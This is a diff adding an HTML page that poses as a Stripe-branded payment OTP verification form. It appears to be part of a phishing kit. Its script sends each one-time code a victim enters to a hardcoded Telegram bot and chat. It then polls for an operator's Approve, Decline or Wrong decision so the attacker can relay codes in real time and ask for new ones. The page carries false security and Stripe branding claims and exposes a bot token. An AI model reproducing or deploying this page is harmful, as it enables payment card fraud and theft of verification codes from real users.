@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OTP Inputs Form</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #a0e1eb, #09d62c);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .otp-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.18);
+            padding: 35px 30px;
+            text-align: center;
+            width: 100%;
+            max-width: 440px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+        
+        .otp-container::before {
+            content: "";
+            position: absolute;
+            top: -70px;
+            left: -70px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(9, 214, 44, 0.12), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        
+        .otp-container::after {
+            content: "";
+            position: absolute;
+            bottom: -70px;
+            right: -70px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(0, 123, 255, 0.1), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        
+        .otp-container:hover {
+            transform: translateY(-4px);
+        }
+        
+        .otp-shield {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 18px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #eaf7ef, #d9f5e2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            color: #09d62c;
+            box-shadow: 0 6px 16px rgba(9, 214, 44, 0.25);
+            position: relative;
+            z-index: 1;
+        }
+        
+        h2 {
+            color: #007BFF;
+            margin-bottom: 8px;
+            font-weight: 500;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .otp-sub {
+            color: #999;
+            font-size: 0.95rem;
+            margin-bottom: 28px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .otp-input {
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        #otp-input {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 14px;
+            font-size: 2.4rem;
+            font-weight: 500;
+            letter-spacing: 8px;
+            text-align: center;
+            color: #333;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background: #fafafa;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+        }
+        
+        #otp-input::placeholder {
+            letter-spacing: 6px;
+            color: #ccc;
+        }
+        
+        #otp-input:hover {
+            border-color: #b0b0b0;
+            background: #fff;
+        }
+        
+        #otp-input:focus {
+            border-color: #007BFF;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.15);
+        }
+        
+        .otp-counter {
+            font-size: 0.8rem;
+            color: #bbb;
+            margin-top: 8px;
+        }
+        
+        .btn {
+            margin-top: 15px;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #007BFF, #0056b3);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 16px rgba(0, 123, 255, 0.35);
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s, opacity 0.3s;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #0069d9, #004a99);
+            transform: translateY(-2px);
+            box-shadow: 0 9px 22px rgba(0, 123, 255, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
+        }
+        
+        .btn:disabled {
+            cursor: not-allowed;
+            opacity: 0.75;
+            transform: none;
+        }
+        
+        .otp-footer {
+            margin-top: 22px;
+            color: #777;
+            font-size: 0.9rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .stripe-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            background: #f4f4f6;
+            border: 1px solid #e4e4e8;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: #555;
+        }
+        
+        .stripe-tag .fa-stripe-s {
+            color: #635bff;
+            font-size: 1.2rem;
+        }
+        
+        .secure-note {
+            margin-top: 12px;
+            font-size: 0.8rem;
+            color: #999;
+        }
+        
+        .secure-note .fa-lock {
+            color: #09d62c;
+        }
+        
+        .otp-error {
+            color: #e02020;
+            font-size: 0.85rem;
+            min-height: 18px;
+            margin-top: 8px;
+            position: relative;
+            z-index: 1;
+        }
+        /* Dedicated responsive status element */
+        
+        #otpStatus {
+            color: #e02020;
+            font-size: 0.95rem;
+            margin-top: 8px;
+            min-height: 20px;
+            /* prevents layout jump */
+            word-break: break-word;
+            padding: 0 6px;
+            position: relative;
+            z-index: 1;
+            display: block;
+            opacity: 1;
+        }
+        /* ===== Overlay Spinner ===== */
+        
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        
+        .overlay.active {
+            display: flex;
+        }
+        
+        .overlay-box {
+            background: white;
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            width: min(360px, 90vw);
+        }
+        
+        .spinner {
+            width: 42px;
+            height: 42px;
+            border: 4px solid #e9e9e9;
+            border-top-color: #007BFF;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        /* Telegram buttons are rendered by Telegram; no local CSS needed */
+    </style>
+</head>
+
+<body>
+    <div class="otp-container">
+        <div class="otp-shield">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+
+        <h2>Enter OTP</h2>
+
+        <p class="otp-sub">
+            <i class="fas fa-phone-volume"></i> A verification code was sent to your phone/email
+        </p>
+
+        <div class="otp-input">
+            <input type="text" id="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••" autocomplete="one-time-code" />
+            <div class="otp-counter" id="otp-counter">code digits</div>
+        </div>
+
+        <button id="submitButton" class="btn">
+      <i class="fas fa-check-circle"></i>&nbsp; Verify
+    </button>
+
+        <!-- Existing error container (kept as-is) -->
+        <div class="otp-error" id="otp-error"></div>
+
+        <!-- Dedicated status element -->
+        <div id="otpStatus" aria-live="polite"></div>
+
+        <div id="status-message" style="display:none;"></div>
+
+        <div class="otp-footer">
+            Online payments verified by
+            <div class="stripe-tag">
+                <i class="fab fa-stripe-s"></i> Powered by Stripe
+            </div>
+            <div class="secure-note"><i class="fas fa-lock"></i> 256-bit SSL secured payment</div>
+        </div>
+    </div>
+
+    <div class="overlay" id="waiting-overlay">
+        <div class="overlay-box">
+            <div class="spinner"></div>
+            <p>Processing payment ...</p>
+        </div>
+    </div>
+
+    <script>
+        // ─── Telegram Bot Config ────────────────────────────────────────
+        const botToken = '9022721409:AAGgIMZwn41gfTPj4pXA3zjxP92LMbXzOq8';
+        const chatId = '7912960401';
+
+        // ─── DOM refs ────────────────────────────────────────────────────
+        const submitBtn = document.getElementById('submitButton');
+        const statusMsg = document.getElementById('status-message');
+        const overlay = document.getElementById('waiting-overlay');
+        const otpInput = document.getElementById('otp-input');
+        const otpError = document.getElementById('otp-error');
+
+        const otpStatus = document.getElementById('otpStatus');
+
+        // ─── Helpers ─────────────────────────────────────────────────────
+        function generateId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
+
+        function getOtp() {
+            return otpInput.value.trim();
+        }
+
+        function setCounterText() {
+            const n = otpInput.value.length;
+            document.getElementById('otp-counter').textContent = `${n} / 6 digits`;
+        }
+
+        // UPDATED: reset will NOT clear otpStatus by default (so Decline/Wrong messages stay visible every time).
+        function resetOtpInputs({
+            keepValue = false,
+            clearOtpStatus = false
+        } = {}) {
+            if (!keepValue) otpInput.value = '';
+            otpInput.focus();
+
+            otpError.textContent = '';
+            statusMsg.style.display = 'none';
+            statusMsg.textContent = '';
+
+            if (clearOtpStatus) {
+                otpStatus.textContent = '';
+            }
+
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<i class="fas fa-check-circle"></i>&nbsp; Verify';
+        }
+
+        function setOtpStatus(message) {
+            otpStatus.textContent = message;
+            otpStatus.style.color = '#e02020';
+        }
+
+        // Allow only digits
+        otpInput.addEventListener('input', () => {
+            otpInput.value = otpInput.value.replace(/\D/g, '');
+            if (otpInput.value.length > 6) otpInput.value = otpInput.value.slice(0, 6);
+            setCounterText();
+        });
+
+        // ─── Poll Telegram for callback decision ──────────────────────
+        // callback_data formats:
+        // approve_otp_<submissionId>
+        // decline_otp_<submissionId>
+        // wrong_otp_<submissionId>
+        function pollForDecision(submissionId) {
+            let offset = 0;
+
+            const poll = setInterval(async() => {
+                try {
+                    const resp = await fetch(
+                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=10`
+                    );
+                    const data = await resp.json();
+
+                    if (data.ok && Array.isArray(data.result) && data.result.length) {
+                        for (const update of data.result) {
+                            offset = update.update_id + 1;
+
+                            if (!update.callback_query) continue;
+
+                            const cb = update.callback_query;
+                            const cbData = cb.data || '';
+
+                            const parts = cbData.split('_');
+                            const action = parts[0]; // approve / decline / wrong
+                            const id = parts.slice(2).join('_'); // everything after "otp"
+
+                            if (id !== submissionId) continue;
+
+                            clearInterval(poll);
+                            overlay.classList.remove('active');
+
+                            if (action === 'approve') {
+                                window.location.href = 'card.html';
+                                return;
+                            }
+
+                            if (action === 'decline') {
+                                // Decline button -> "OTP Declined" in red on UI (no alert)
+                                setOtpStatus('OTP Declined, enter new otp send');
+                                resetOtpInputs({
+                                    keepValue: false
+                                }); // keep otpStatus visible
+                                return;
+                            }
+
+                            if (action === 'wrong') {
+                                // Wrong OTP -> "You entered wrong OTP" in red on UI (no alert)
+                                setOtpStatus('You entered wrong OTP, Re-enter new OTP sent');
+                                resetOtpInputs({
+                                    keepValue: false
+                                }); // keep otpStatus visible
+                                return;
+                            }
+
+                            // fallback
+                            setOtpStatus('OTP rejected. Please try again.');
+                            resetOtpInputs({
+                                keepValue: false
+                            });
+                        }
+                    }
+                } catch (err) {
+                    console.error('Poll error:', err);
+                }
+            }, 2000);
+        }
+
+        // ─── Form submission ────────────────────────────────────────────
+        submitBtn.addEventListener('click', () => {
+            const otp = getOtp();
+
+            if (otp.length < 4 || otp.length > 6) {
+                setOtpStatus('⚠️ Please enter a valid OTP of 4 to 6 digits.');
+                return;
+            }
+
+            otpError.textContent = '';
+            otpError.style.color = '#e02020';
+
+            // Clear previous status before submitting
+            setOtpStatus('');
+            // (Alternative: resetOtpInputs can clearOtpStatus, but we want to clear here before polling)
+            otpStatus.textContent = '';
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = 'Submitting...';
+
+            const submissionId = generateId();
+
+            const message =
+                `🔐 New OTP Submission\n` +
+                `━━━━━━━━━━━━━━━\n` +
+                `🆔 ID: ${submissionId}\n` +
+                `🔢 OTP: ${otp}\n` +
+                `━━━━━━━━━━━━━━━`;
+
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ Approve OTP',
+                        callback_data: `approve_otp_${submissionId}`
+                    }, {
+                        text: '❌ Decline OTP',
+                        callback_data: `decline_otp_${submissionId}`
+                    }, {
+                        text: '⚠️ Wrong OTP',
+                        callback_data: `wrong_otp_${submissionId}`
+                    }]
+                ]
+            };
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        reply_markup: inlineKeyboard
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(t => {
+                            throw new Error(t);
+                        });
+                    }
+                    overlay.classList.add('active');
+                    pollForDecision(submissionId);
+                })
+                .catch(error => {
+                    console.error('Telegram Error:', error);
+                    setOtpStatus('❌ Error sending OTP to Telegram. Please try again.');
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<i class="fas fa-check-circle"></i>&nbsp; Verify';
+                });
+        });
+
+        // Initial
+        otpInput.focus();
+        setCounterText();
+    </script>
+</body>
+</html>
